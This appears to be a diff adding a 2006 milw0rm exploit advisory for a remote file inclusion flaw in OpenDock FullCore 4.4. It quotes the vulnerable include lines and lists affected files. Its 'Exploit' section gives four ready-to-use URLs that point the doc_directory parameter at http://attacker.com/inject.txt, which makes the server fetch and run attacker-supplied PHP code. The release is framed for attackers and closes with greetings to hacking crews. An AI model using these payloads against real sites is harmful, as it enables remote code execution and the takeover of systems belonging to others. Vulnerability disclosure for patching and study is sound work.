@@ -1,0 +1,61 @@
+---------------------------------------------------------------------------------
+OpenDock FullCore <= v4.4 Remote File Include Vulnerabilities
+---------------------------------------------------------------------------------
+
+Author : Matdhule
+
+Contact : matdhule@gmail.com
+
+Application : OpenDock FullCore
+
+Version : 4.4
+
+Download : http://web.opendock.net//up_file/opendock_full_core_44_66_od.zip
+
+---------------------------------------------------------------------------------
+
+Vulnerability:
+
+In folder sw we found vulnerability script index_sw.php.
+
+-----------------------index_sw.php---------------------------------
+<?php
+
+include $doc_directory.$path_sw."lib_config/lib_sys_config.php";
+include $doc_directory.$path_sw."lib_main/lib_main.php";
+
+-------------------------------------------------------------------------
+
+Input passed to the "$doc_directory" parameter in index_sw.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Also affected files on Files:
+
+sw/lib_cart/cart.php
+sw/lib_cart/lib_cart.php
+sw/lib_cart/lib_read_cart.php
+sw/lib_cart/lib_sys_cart.php
+sw/lib_cart/txt_info_cart.php
+sw/lib_comment/comment.php
+sw/lib_comment/find_comment.php
+sw/lib_comment/lib_comment.php
+sw/lib_find/find.php
+
+And many others files...
+
+---------------------------------------------------------------------------------
+
+Exploit :
+
+http://target.com/[OpenDockFullCore_Path]/sw/index_sw.php?doc_directory=http://attacker.com/inject.txt ?
+http://target.com/[OpenDockFullCore_Path]/sw/lib_cart/cart.php?doc_directory=http://attacker.com/inject.txt ?
+http://target.com/[OpenDockFullCore_Path]/sw/lib_cart/lib_cart.php?doc_directory=http://attacker.com/inject.txt ?
+http://target.com/[OpenDockFullCore_Path]/sw/lib_comment/comment.php?doc_directory=http://attacker.com/inject.txt ?
+
+---------------------------------------------------------------------------------
+
+Greetz : solpot, j4mbi_h4ck3r, h4ntu, the_day, bius, thama & all crews #nyubicrew, #e-c-h-o, @dalnet
+
+# milw0rm.com [2006-10-16]
